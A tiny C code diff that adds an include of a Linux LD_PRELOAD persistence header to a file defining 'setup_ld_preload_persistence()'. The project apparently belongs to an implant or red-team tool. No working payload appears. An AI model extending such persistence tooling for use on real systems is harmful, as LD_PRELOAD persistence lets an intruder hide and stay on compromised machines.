@@ -3,6 +3,7 @@
 #include <string.h>
 #include <unistd.h>
 #include "info.h"
+#include "linux_persistence_ldpreload.h"
 
 #ifdef LD_PRELOAD_MOD
 void setup_ld_preload_persistence() {
